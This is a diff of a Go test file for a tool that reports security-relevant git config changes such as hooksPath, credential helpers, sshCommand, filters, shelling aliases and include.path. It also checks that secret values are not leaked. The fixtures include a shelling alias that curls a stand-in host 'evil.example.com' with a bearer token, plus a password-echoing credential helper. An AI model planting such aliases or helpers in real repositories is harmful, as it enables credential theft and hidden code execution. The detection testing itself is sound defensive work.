@@ -86,39 +86,67 @@ func TestExitReportSilence(t *testing.T) {
 
 func TestExitReportGitConfig(t *testing.T) {
 	for _, tc := range []struct {
-		name  string
-		key   string
-		value string
+		name string
+		key  string
+		val  string
+		// showsValue: a path-like destination is the point of the message; a
+		// helper/command value is secret-shaped and must be named only.
+		showsValue bool
 	}{
-		{"hooksPath redirect", "core.hooksPath", ".husky/_"},
-		{"credential helper", "credential.helper", "!/tmp/x"},
-		{"ssh command", "core.sshCommand", "/tmp/ssh"},
-		{"fsmonitor", "core.fsmonitor", "/tmp/mon"},
-		{"filter smudge", "filter.evil.smudge", "/tmp/s"},
-		{"diff textconv", "diff.evil.textconv", "/tmp/t"},
-		{"init templateDir", "init.templateDir", "/tmp/tpl"},
+		{"hooksPath redirect", "core.hooksPath", ".husky/_", true},
+		{"init templateDir", "init.templateDir", "/tmp/tpl", true},
+		{"credential helper", "credential.helper", "!f() { echo password=hunter2; }; f", false},
+		{"ssh command", "core.sshCommand", "ssh -i /tmp/id_leak", false},
+		{"fsmonitor", "core.fsmonitor", "/tmp/mon --token=abc123", false},
+		{"filter smudge", "filter.evil.smudge", "/tmp/s --key=sekrit", false},
+		{"diff textconv", "diff.evil.textconv", "/tmp/t", false},
+		{"url insteadOf", "url.https://tok3n@example.com/.insteadOf", "https://example.com/", false},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			paths, dir := exitRepo(t)
-			got := exitReport(t, paths, func() { gitIn(t, dir, "config", tc.key, tc.value) })
-			// The rule: the exec-relevant key is named, and so is where it now
-			// points -- that is the whole reason for saying anything.
+			got := exitReport(t, paths, func() { gitIn(t, dir, "config", tc.key, tc.val) })
 			if !strings.Contains(strings.ToLower(got), strings.ToLower(tc.key)) {
 				t.Errorf("expected %s to be named, got:\n%s", tc.key, got)
 			}
-			if !strings.Contains(got, tc.value) {
-				t.Errorf("expected the new value %q, got:\n%s", tc.value, got)
+			if tc.showsValue && !strings.Contains(got, tc.val) {
+				t.Errorf("expected the destination %q to be shown, got:\n%s", tc.val, got)
+			}
+			// A helper or command value is a shell snippet and routinely embeds
+			// a token. Naming the key is the whole job; quoting it is a leak.
+			if !tc.showsValue && strings.Contains(got, tc.val) {
+				t.Errorf("VALUE LEAKED for %s (%q):\n%s", tc.key, tc.val, got)
 			}
 		})
 	}
 
-	t.Run("a plain alias is quiet, a shelling alias speaks", func(t *testing.T) {
+	t.Run("a plain alias is quiet, a shelling alias speaks without its body", func(t *testing.T) {
 		paths, dir := exitRepo(t)
 		if got := exitReport(t, paths, func() { gitIn(t, dir, "config", "alias.co", "checkout") }); got != "" {
 			t.Errorf("a plain alias must not speak, got:\n%s", got)
 		}
-		if got := exitReport(t, paths, func() { gitIn(t, dir, "config", "alias.pwn", "!sh -c 'curl evil'") }); !strings.Contains(got, "alias.pwn") {
+		body := "!sh -c 'curl evil.example.com -H \"Authorization: Bearer sekrit\"'"
+		got := exitReport(t, paths, func() { gitIn(t, dir, "config", "alias.pwn", body) })
+		if !strings.Contains(got, "alias.pwn") {
 			t.Errorf("a ! alias must speak, got:\n%s", got)
+		}
+		if strings.Contains(got, "sekrit") {
+			t.Errorf("VALUE LEAKED from an alias body:\n%s", got)
+		}
+	})
+
+	// git-lfs writes filter.lfs.{clean,smudge,process} on `git lfs install`, in
+	// every LFS repo, as ordinary setup. Ranking those would break the silence
+	// the whole feature depends on (grok review).
+	t.Run("git lfs config is not wallpaper", func(t *testing.T) {
+		paths, dir := exitRepo(t)
+		got := exitReport(t, paths, func() {
+			gitIn(t, dir, "config", "filter.lfs.clean", "git-lfs clean -- %f")
+			gitIn(t, dir, "config", "filter.lfs.smudge", "git-lfs smudge -- %f")
+			gitIn(t, dir, "config", "filter.lfs.process", "git-lfs filter-process")
+			gitIn(t, dir, "config", "filter.lfs.required", "true")
+		})
+		if got != "" {
+			t.Errorf("`git lfs install` config must not speak, got:\n%s", got)
 		}
 	})
 
@@ -134,6 +162,25 @@ func TestExitReportGitConfig(t *testing.T) {
 			t.Errorf("a --worktree hooksPath must speak, got:\n%s", got)
 		}
 	})
+}
+
+// A watched file deleted outright takes its keys with it -- the same
+// user-visible event as clearing them one at a time (grok review).
+func TestExitReportWholeFileDeletion(t *testing.T) {
+	paths, dir := exitRepo(t)
+	env := filepath.Join(dir, ".env")
+	mustWriteFile(t, env, []byte("DATABASE_URL=x\nAPI_TOKEN=y\n"), 0o644)
+
+	got := exitReport(t, paths, func() {
+		if err := os.Remove(env); err != nil {
+			t.Fatal(err)
+		}
+	})
+	for _, want := range []string{"DATABASE_URL", "API_TOKEN", "removed"} {
+		if !strings.Contains(got, want) {
+			t.Errorf("expected %q after deleting the file, got:\n%s", want, got)
+		}
+	}
 }
 
 func TestExitReportHooks(t *testing.T) {
@@ -315,9 +362,14 @@ func TestExitReportWorktreeNamesTheMainTree(t *testing.T) {
 	if !strings.Contains(got, "pre-commit") {
 		t.Errorf("a worktree session must cover the common git dir, got:\n%s", got)
 	}
-	// It must not read as a path inside the worktree's own checkout.
-	if strings.HasPrefix(strings.TrimSpace(got), ".git/") {
-		t.Errorf("main-tree path rendered as worktree-relative:\n%s", got)
+	// It must not read as a path inside the worktree's own checkout. Checked
+	// per LINE: the banner means the whole report never starts with ".git/",
+	// so a whole-output prefix check can never fail (grok review caught that
+	// this assertion was vacuous).
+	for _, line := range strings.Split(got, "\n") {
+		if strings.HasPrefix(strings.TrimLeft(line, " "), ".git/") {
+			t.Errorf("main-tree path rendered as worktree-relative:\n%s", got)
+		}
 	}
 	if !strings.Contains(got, main) && !strings.Contains(got, "~") {
 		t.Errorf("expected an unambiguous location for the main tree, got:\n%s", got)
@@ -327,3 +379,18 @@ func TestExitReportWorktreeNamesTheMainTree(t *testing.T) {
 // timeAfterSeconds keeps the hang test readable without importing time into
 // every case above.
 func timeAfterSeconds(n int) <-chan time.Time { return time.After(time.Duration(n) * time.Second) }
+
+// byre does not follow git's include graph (ADR 0047's stated residual): an
+// exec-capable key can sit in an included file byre never reads. What it CAN
+// do is say that an include appeared, which is why include.path is itself
+// exec-relevant. This pins the compensation, not git's behaviour.
+func TestExitReportIncludeIsNamedNotFollowed(t *testing.T) {
+	paths, dir := exitRepo(t)
+	extra := filepath.Join(dir, "extra.cfg")
+	mustWriteFile(t, extra, []byte("[core]\n\thooksPath = /tmp/included-hooks\n"), 0o644)
+
+	got := exitReport(t, paths, func() { gitIn(t, dir, "config", "include.path", extra) })
+	if !strings.Contains(strings.ToLower(got), "include.path") {
+		t.Errorf("a new include must be named, got:\n%s", got)
+	}
+}
